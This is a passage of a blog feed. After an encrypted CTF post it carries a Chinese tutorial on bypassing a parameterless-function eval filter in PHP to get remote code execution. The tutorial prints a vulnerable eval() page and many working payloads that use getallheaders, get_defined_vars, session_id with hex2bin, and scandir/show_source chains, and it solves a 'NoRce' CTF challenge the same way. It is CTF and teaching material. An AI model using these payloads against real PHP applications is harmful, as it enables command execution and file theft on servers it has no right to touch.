fb05dfc0171d754c8f233929241a3abd62bdb0e65253db1da2e90acc56f2d24a71678f3c2caa88ba93b0d892712baab5ff0569fe3a2b177fdd7c4ee561b16ace24f30dbfd4a6a164010e56465112415a67ea759ecf47139f58662453342abe75660f3b9578a00f97bb09708555ad4799ccc1a6779b5df74cfc5fd8a25cde878449851028ce8e2510754a00bf037f03db754fcf32e5ce8368a91dca8a020cdc5c906c63f23f4efefec13bd0351f7467a80c7c11b3db1e648ec6c06152c01f02606f6cf041269fdbbe9a41fc87abe1fb9cdff24689ef80c1473e592ba326b18ff9f23881c0d5fd7f8d802d54ce275555d47d62793b96a6ff3be1845395eb1e3d14b7b355fe1b750d85059cc266db25edabb4aec6b6ee91bdff63702f31dfb6271917a41f25c4537ddba67dfed89d889d85ad75f24b62aa826fe7756e654ebe5c84623bc9cb0dbc6446d85ffd2f2b03d6ed28be0f817f2be59c1ddd823bcf6ca064b29d37041ffeaa242aa510fd347d9a430eca402a47c70213742c80795488a670d0abef4b8db2946330a44e0481c75cb953bc9797c5cc2d6ef777c2bfbf953939509aca6d34b1fb441e3e20f3334ddfb9bc2d271bd0f90f430754670c802bfd218d1990a013154f8a95824e83009337c450595fadcd8aa46729dd089fee7cf715136cdffe2c14d6489194d7244241cfe1498dee5a2c14b0597875a003eaab13fa661761d5a69f16e0582a0f8dec84b228c41a6a41509b9c05460a6a612dd83a4033ff5fb24c9f7b44edb9b4e3fb41d8457462508597549615d468dd9e700ff94d39b582e73ce8db0762d10ef0c4a778254e1bf1f5415f3b7234d8386ac0ac2282447f92228801ab32c50ea30fded9e5fa36c54b290d2b66134720797144340283d0bf8259141dca0fbc2c645c89fc703cd221ceaef449633a96607280a362527f0c69185781e1ec77519612e3c221fa7c70fe696fbd565051e1ce2d40356b03ec44759a6f6fbf09028bc192e2dcacb4ae642f2c6f5e0b0b08d8cc645ab91b0c7dcef13ae10b3e1e10085603e348b89730c5246f9f6062796bd2ea6fffd637cdb37e84b8fce8f42aeea61cef0aa1a093eec12a76c3e8b29fcf26de403019f1221d8c9716f756dbebf9cd718dcd85077995a52259435f82ed05117dc4f24668814fc46d81764b23dc6e4b8909be3fdf4a512a4a6e31c4e76cb710af7a2fe45e8991a3478e73db219773c7c72096fbf20aaddbba21a47e4d3ac3194d08ff099ad40952b69356e720e006d4e697edc3ce74a153d4271c63d5d6b543577e844a47b1f98747236362b74f260a4c1f1d0ca6dd22567b767f3f73861882283d7b2ae3fb7b12951dfd47dc02cfba7b17da8e1774d95c66061e34ffb787763463c463d13995e8b6940baef66bd01c860c895ba245a3255191fb4b175c1779c51c684660b454729006a5ce29debd9850abbb1855167fe00c5c84eeeefcf874edfd510e54b3b28e29b0b56fc4ce4dffd45b233a1d6543604397d56f35cdf164040896416af95410d6c877ccec0bbe57ac53e2d5e59e4d345c9ab93cc34b4ffe8fb1691c273e33c913bfbc3b9bdc1ec32d36f7e28fcd9ec23c3dadafb3d9b562453396199d6307cce6febad73110a8d9393dad5e7a5beca6173636e75b17aa79daf5b1a8f4357af922a69a4857c1974ce2b76b047821969a9c4c5be2ebb333bedb06d951eef29b103377fb15853d95d014c5ca60322d5ffb26bb76ad075a935febeaac588bbde32431c98557ce1d5006fc9f9e765cca52c72472096963945026e4ddb3755fd66c6bcd1d4e327b91c804e54579ef9930e143914e1369348628ea32d868e5f662188ed0ec6d2b05d8862a0ed2e0d36fb53c325cf678444b0d710d9aecee1e1b6154b2ddaab2e394c334bb4d167493e2d7c9fbbceab230357c17a04eb8a2260c1af28945c2ded5b67df503cb36aa964865f2a42e8462ba426bd744d55a511ef5cd3a46a856d0fe375b186b93406c36e62192eaa646627ddb8aff7a30d8259b7069fdcc45577e2e4758af805aaf62342ddd70f05c98b624c1ff09447e9b1b47af6d3162c3af3be2c782b6280c4c4406b3ee0e46b045e97eaaa82453072c916355d240df7afe0899a0c843f508d7c7ba695b88ee124a6505fd9976e04288d654926a6829bc65482dd5a9f897d43b873fc4f0fcddd660d150f97ed0874e6c896fe8c83ae27d27753da6c340d4af45ff227e06c0981e75c2a4d9c71822813d878f4a3529225da0588e4df77b5ba909d56ff316b9d8028b038cb7a99668d2d97512b85119c2cba9d350f4a4787198fa8fd0695d50e913ec7170fc344fb6a324e7e8a8d6a2eed286df1451eb1bf6c1b245fd1b71592139b0b225fd703bc952d79daa95b9dfc7d61b0f2edd757c3b64ecbfbf5056edd2547782660b3292d5dfcb65f6f921e9aea080a45c400505fdf7378ad420c79a5c657c063c694b71a1678f78d1ed361fbc7a3d157b132264d2a17576cb8fc7c6597e7688c870b2498362adefb65ef9037a4f31e44c07174e624954f99fb8464db7a2f2319977e60f217dffa8b453646e433bdf7879bf666e0623820f5e8ef01e81ca14e2bda8cb55a8553d70f03cf865a7b026724716b943f077b508016b37878f7d8e4cf5b25dfad06f219223fa6a1d2cd9ef3900245dc168a3601a6fcde3bbdf34fae75f883ca9841881aa56f87fabc451642a4775d62adb47e88188f0226d2102899637fce299594f401586c4d0c2b63178fe78b39160cfa30342863d96c85e7a7b84be0757aac6b107d7ef19a6c40d1e87b27f46734acdac3aa40dbb10bf50ae63e4a992fb64929ab2277d8d6e18c52d4aaa8a930589e30e9b39498dede04a12b8c75921c5f31ddf02f5d4b611bd591f9292714c8eb683d5fa656a5602135a9d21cea177bb76b3c604670c9818249d92036b4572d13b6ed069a2cc6f2c1d093a112cda2950247d838f9f08220f5f42f1ecb7d2ab7c0b087c460334cdd77bf8226483cebcff03e837e87b290250d807691948fd838c891720025fb90deb375dea625e3c88e7f9278ad7aaf1a81cb89cc47ffdab88a1c326b93b6f0df9f087340fe8ee6d7f4efa9311eb86c345bc972c26b6d03f1cebafd47c4aea3d612e9658940a96f2e0370af498d6d1071248e3f4f5fcdaca49d168b487f67a7eb97519453d2b1345b48f9962880dd7ac9874fcef1c144c66520e69c403b7919dbf29a92ba1add7cac8cf18e08e4cb159d6ee6773590f982706c2a874c87e224bf5266216242dc70647dd1b1444aeaefce9c064f5b2b3cd4bf89e0cddf48e3ec7a4477299f7904bec1ad5b1a4dd0bc0505ded926d2bf5bb8b8b211cbee75c31d1e4f30bd4c75b809adb20df3839ede1870e1df5fe0ad960e2f8f50ff81ef813b43db67858ae82b7f8c7b862fa0dea656afe747f99e1aa33335b1154b3d3c5ae6c7c2977c19a1ca23061b3f6d58a7c9d1447c08a2bf61c805736285d64127321bed70fb3cb068235fa507e9b2f66f1213782981180a6419df7e0772dded20a12928ced038cab6c32822f0387dedf118a2efacc797e1490cb3158d18db98bfc0ff34d503a71f21dbcd8cce32350a5b1a3420b46e8cb06dfab02d00043793073e4e4c1b41b866cd2eb1ea1930785bd956f8c3f17ba657618ebb0b55b7ce079cfeed286ef284153fa9a2d9573b84153a7beeff5dabe4197879ae6b384d4ca420c7c7baf38caa8a574eefca7caba10674f692313108fcc1cc75c15772b2af8e302a2395fc5fb144957c66ddfee5962e90069d9e5ab664e364178dd9ebd48c56a5c0e8300ece89f7e8942d64d349ebd2d256d85895bfd7ccec0e5b3a92b505d09a69e4e3b68af0fe3f4c64d4868eed07319481fd3e66f7838af252d4c2be742c9311a19e861b943d8a958dd8b8b7d330d1f7e87d88ad145550908e7ad39fa877a06988f7896b26c7495ff4e8e8c2df995db8d1b573a2f4845dc3e7670fc953126577e830680529c7699099c993ef5e9c830ab94ab40ebf210af0467979c527e4169922afbfb3658781b69e2bd03909273bf42eb97b35eaf46e5712c6bfb8dca889bfbc5a9150279dfa3449254854d24f057010fdf6d6e5b40832fca929ab000333354cc354c96e09780d9541509c6f3d25ff849e7999715f72249ab6980b476e3fc45f93175cc368abdc24af68a604eb577a3a76eaa24b4258f07a38e0bacb96f418ade7da128e98cee6840567db80462b9821eb699651683c7b53afcac8862675d91eb952f1e834f152aa8206eedb1262ac6cf016dc3e506c67a7daf194f2b785da7b927b4f477c81c681dfedd187c831622ebe98668a03728dc70edccadd87a62f6f6e4d90</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="CTF" scheme="https://sakurahack-y.github.io/categories/CTF/"/>
    
    <category term="刷题" scheme="https://sakurahack-y.github.io/categories/CTF/%E5%88%B7%E9%A2%98/"/>
    
    
    <category term="CTF" scheme="https://sakurahack-y.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>无参数rec</title>
    <link href="https://sakurahack-y.github.io/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/"/>
    <id>https://sakurahack-y.github.io/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/</id>
    <published>2022-04-10T06:32:10.000Z</published>
    <updated>2022-04-10T17:33:42.106Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h1><pre><code class="php">&lt;?phphighlight_file(__FILE__);if(&#39;;&#39; === preg_replace(&#39;/[^\W]+\((?R)?\)/&#39;, &#39;&#39;, $_GET[&#39;code&#39;])) &#123;        eval($_GET[&#39;code&#39;]);&#125;?&gt;</code></pre><p>这里使用preg<em>replace替换匹配到的字符为空，\w匹配字母、数字和下划线，等价于 [^A-Za-z0-9</em>]，然后(?R)?这个意思为递归整个匹配模式。所以正则的含义就是匹配无参数的函数，内部可以无限嵌套相同的模式（无参数函数），将匹配的替换为空，判断剩下的是否只有;<br>以上正则表达式只匹配a(b(c()))或a()这种格式，不匹配a(“123”)，也就是说我们传入的值函数不能带有参数，所以我们要使用无参数的函数进行文件读取或者命令执行。</p><h1 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h1><pre><code class="php">目录操作：getchwd() ：函数返回当前工作目录。scandir() ：函数返回指定目录中的文件和目录的数组。dirname() ：函数返回路径中的目录部分。chdir() ：函数改变当前的目录。数组相关的操作：end() - 将内部指针指向数组中的最后一个元素，并输出。next() - 将内部指针指向数组中的下一个元素，并输出。prev() - 将内部指针指向数组中的上一个元素，并输出。reset() - 将内部指针指向数组中的第一个元素，并输出。each() - 返回当前元素的键名和键值，并将内部指针向前移动。array_shift() - 删除数组中第一个元素，并返回被删除元素的值。array_rand() 函数返回数组中的随机键名，或者如果您规定函数返回不只一个键名，则返回包含随机键名的数组。array_flip() 函数用于反转/交换数组中所有的键名以及它们关联的键值。array_slice() 函数在数组中根据条件取出一段值，并返回。array_reverse() 函数返回翻转顺序的数组。读文件show_source() - 对文件进行语法高亮显示。readfile() - 输出一个文件。highlight_file() - 对文件进行语法高亮显示。file_get_contents() - 把整个文件读入一个字符串中。readgzfile() - 可用于读取非 gzip 格式的文件    编码chr() 函数从指定的 ASCII 值返回字符。hex2bin() — 转换十六进制字符串为二进制字符串。</code></pre><h1 id="关键函数"><a href="#关键函数" class="headerlink" title="关键函数"></a>关键函数</h1><h2 id="getenv"><a href="#getenv" class="headerlink" title="getenv()"></a>getenv()</h2><p>**getenv():**获取环境变量的值(在PHP7.1之后可以不给予参数)</p><p>适用于：php7以上的版本</p><p>php7.0以下版本返回bool(false)</p><pre><code>?code=var_dump(getenv());</code></pre><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220410235047746.png" alt="image-20220410235047746"></p><p>php7.0以上版本</p><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220410235228226.png" alt="image-20220410235228226"></p><p>还可以通过这个打开phpinfo()页面</p><pre><code>?code=var_dump(getenv(phpinfo()));</code></pre><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220410235551070.png" alt="image-20220410235551070"></p><h2 id="getallheaders"><a href="#getallheaders" class="headerlink" title="getallheaders()"></a>getallheaders()</h2><p>**getallheaders:**获取所有 HTTP 请求标头，是apache_request_headers()的别名函数，但是该函数只能在Apache环境下使用</p><pre><code>?code=print_r(getallheaders());</code></pre><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220410235935581.png" alt="image-20220410235935581"></p><p><strong>payload1</strong></p><pre><code>?code=eval(reset(getallheaders()));# post中增加请求头flag: system(&#39;whoami&#39;);</code></pre><p>在我的burp中经过测试，设置的请求头跑到了最前面，这个问题我也很奇怪，网上流传的是取最后一个头，那我这里就取第一个吧。</p><p>测试一下，在这里添加请求头</p><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411000647293.png" alt="image-20220411000647293"></p><p>输出一下第一个请求头</p><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411000715021.png" alt="image-20220411000715021"></p><p>我们发现我们构造的请求头在最开始，那么我们就可以构造出payload。其实在开头还是结尾，问题都不大，灵活变通即可。</p><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411001023643.png" alt="image-20220411001023643"></p><p><strong>payload2</strong></p><p>在php7以上的版本使用</p><pre><code>?code=eval(end(apache_request_headers()));</code></pre><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411001253812.png" alt="image-20220411001253812"></p><h2 id="get-defined-vars"><a href="#get-defined-vars" class="headerlink" title="get_defined_vars()"></a>get_defined_vars()</h2><p><strong>get_defined_vars():</strong></p><pre><code>返回由所有已定义变量所组成的数组，会返回$_GET,$_POST,$_COOKIE,$_FILES全局变量的值，返回数组顺序为get-&gt;post-&gt;cookie-&gt;files</code></pre><p><strong>current:</strong></p><pre><code>返回数组中的当前单元，初始指向插入到数组中的第一个单元，也就是会返回$_GET变量的数组值</code></pre><p><strong>payload1</strong></p><pre><code>?code=eval(end(current(get_defined_vars())));&amp;flag=system(&#39;whoami&#39;);</code></pre><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411001923627.png" alt="image-20220411001923627"></p><p><strong>payload2</strong></p><pre><code>?flag=system(&#39;whoami&#39;);&amp;code=eval(reset(current(get_defined_vars())));</code></pre><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411002114740.png" alt="image-20220411002114740"></p><p><strong>payload3</strong></p><pre><code>?flag=phpinfo();&amp;code=eval(pos(pos(get_defined_vars())));</code></pre><p><strong>pos函数:</strong></p><pre><code>pos()是PHP中的内置函数，用于返回内部指针当前指向的数组中元素的值。返回值后，pos()函数不会递增或递减内部指针。</code></pre><p>解释下这个payload</p><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411002640375.png" alt="image-20220411002640375"></p><p>我们发现flag的值是被嵌套在两个数组中，因此如果要取出flag的值，要执行两次pos</p><p>第一次pos：</p><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411002803950.png" alt="image-20220411002803950"></p><p>第二次pos：</p><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411002837861.png" alt="image-20220411002837861"></p><p>成功取出，加上eval函数就可以执行了</p><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411002921084.png" alt="image-20220411002921084"></p><p><strong>payload4</strong></p><pre><code class="python">import requestsfiles = &#123;   &quot;system(&#39;whoami&#39;);&quot;: &quot;&quot;&#125;#data = &#123;#&quot;code&quot;:&quot;eval(pos(pos(end(get_defined_vars()))));&quot;#&#125;r = requests.post(&#39;http://your_vps_ip/1.php?code=eval(pos(pos(end(get_defined_vars()))));&#39;, files=files)print(r.content.decode(&quot;utf-8&quot;, &quot;ignore&quot;))</code></pre><p><code>而如果网站对$_GET,$_POST,$_COOKIE都做的过滤， 那我们只能从$_FILES入手了，file数组在最后一个，需要end定位，然后pos两次定位获得文件名</code></p><h2 id="session-start-函数"><a href="#session-start-函数" class="headerlink" title="session_start()函数"></a>session_start()函数</h2><p>适用于：php7以下的版本</p><p><strong>session_start()</strong></p><pre><code>启动新会话或者重用现有会话，成功开始会话返回 TRUE ，反之返回 FALSE,返回参数给session_id()</code></pre><p><strong>session_id()</strong></p><pre><code>获取/设置当前会话 ID，返回当前会话ID。 如果当前没有会话，则返回空字符串（””）</code></pre><p>可以用这个函数来获取cookie中的<code>phpsessionid</code>了，并且这个值我们是可控的。</p><p>但其有限制：</p><p><strong>文件会话管理器仅允许会话 ID 中使用以下字符：a-z A-Z 0-9 ,（逗号）和 - （减号）</strong></p><p>解决方法：将参数转化为16进制传进去，之后再用hex2bin()函数转换回来就可以了。</p><p><strong>hex2bin()</strong></p><pre><code>转换16进制字符串为二进制字符串</code></pre><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p>payload</p><pre><code>?code=eval(hex2bin(session_id(session_start()))); HTTP/1.1Cookie: PHPSESSID=73797374656d282777686f616d6927293b  # system(&#39;whoami&#39;);</code></pre><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411010515707.png" alt="image-20220411010515707"></p><h3 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h3><pre><code> show_source(session_id(session_start())); var_dump(file_get_contents(session_id(session_start()))); highlight_file(session_id(session_start())); readfile(session_id(session_start())); 然后抓包传入Cookie: PHPSESSID=(想读的文件)即可</code></pre><p>payload</p><pre><code>GET /1.php?code=show_source(session_id(session_start())); HTTP/1.1Cookie: PHPSESSID=/flag</code></pre><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/20220109194247-442d62d6-7141-1.png" alt="img"></p><p>这种方法我并没有测试成功，先写下来吧。</p><h2 id="scandir"><a href="#scandir" class="headerlink" title="scandir"></a>scandir</h2><p><strong>查看当前目录文件名</strong></p><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411011259622.png" alt="image-20220411011259622"></p><p>文件读取</p><p><strong>读取当前目录文件</strong></p><pre><code>当前目录倒数第一位文件：show_source(end(scandir(getcwd())));show_source(current(array_reverse(scandir(getcwd()))));当前目录倒数第二位文件：show_source(next(array_reverse(scandir(getcwd()))));随机返回当前目录文件：highlight_file(array_rand(array_flip(scandir(getcwd()))));show_source(array_rand(array_flip(scandir(getcwd()))));show_source(array_rand(array_flip(scandir(current(localeconv())))));</code></pre><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411011558669.png" alt="image-20220411011558669"></p><p>多试几次</p><p><strong>查看上一级目录文件名</strong></p><pre><code>print_r(scandir(dirname(getcwd())));print_r(scandir(next(scandir(getcwd()))));print_r(scandir(next(scandir(getcwd()))));</code></pre><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411011321325.png" alt="image-20220411011321325"></p><p>函数解释</p><pre><code>array_flip()：交换数组中的键和值，成功时返回交换后的数组，如果失败返回 NULL。array_rand()：从数组中随机取出一个或多个单元，如果只取出一个(默认为1)，array_rand() 返回随机单元的键名。 否则就返回包含随机键名的数组。 完成后，就可以根据随机的键获取数组的随机值。array_flip()和array_rand()配合使用可随机返回当前目录下的文件名dirname(chdir(dirname()))配合切换文件路径</code></pre><p><strong>查看和读取根目录文件</strong></p><p>所获得的字符串第一位有几率是/，需要多试几次</p><pre><code>print_r(scandir(chr(ord(strrev(crypt(serialize(array())))))));</code></pre><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411011343731.png" alt="image-20220411011343731"></p><h1 id="ctf题目讲解"><a href="#ctf题目讲解" class="headerlink" title="ctf题目讲解"></a>ctf题目讲解</h1><h2 id="NoRce"><a href="#NoRce" class="headerlink" title="NoRce"></a>NoRce</h2><p>源码：</p><pre><code class="php">&lt;?phphighlight_file(__FILE__);$exp = $_GET[&#39;exp&#39;];//php7.3 + Apacheif(&#39;;&#39; === preg_replace(&#39;/[^\W]+\((?R)?\)/&#39;, &#39;&#39;, $exp)) &#123;    if(!preg_match(&quot;/o|v|b|print|var|time|file|sqrt|path|dir|exp|pi|an|na|en|ex|et|na|dec|true|false|[0-9]/i&quot;, $exp))&#123;        eval($exp);    &#125;else&#123;        exit(&#39;NoNoNo,U R Hacker~&#39;);    &#125;&#125;else&#123;    exit(&quot;What&#39;s this?&quot;);&#125;?&gt;</code></pre><p>过滤相当严格</p><p>测试一下，发现</p><pre><code>apache_request_headers();</code></pre><p>没有被过滤</p><p>我们还可以利用其它几个没有被过滤的函数构造payload</p><pre><code>die() 函数输出一条消息，并退出当前脚本array_shift() - 删除数组中第一个元素，并返回被删除元素的值</code></pre><p>在我的电脑中，需要把flag头，放在host前，具体原因未知</p><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411013150830.png" alt="image-20220411013150830"></p><p>此时arry_shift()返回的值就是我们要执行的命令</p><p>payload</p><pre><code>?exp=system(array_shift(apache_request_headers()));# postflag: whoami</code></pre><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411013259840.png" alt="image-20220411013259840"></p><p>成功执行命令</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;环境准备&quot;&gt;&lt;a href=&quot;#环境准备&quot; class=&quot;headerlink&quot; title=&quot;环境准备&quot;&gt;&lt;/a&gt;环境准备&lt;/h1&gt;&lt;pre&gt;&lt;code class=&quot;php&quot;&gt;&amp;lt;?php
highlight_file(__FIL</summary>
      
    
    
    
    <category term="CTF" scheme="https://sakurahack-y.github.io/categories/CTF/"/>
    
    <category term="常见漏洞和手法" scheme="https://sakurahack-y.github.io/categories/CTF/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%92%8C%E6%89%8B%E6%B3%95/"/>
    
    
    <category term="代码执行" scheme="https://sakurahack-y.github.io/tags/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
    
  </entry>
  
</feed>
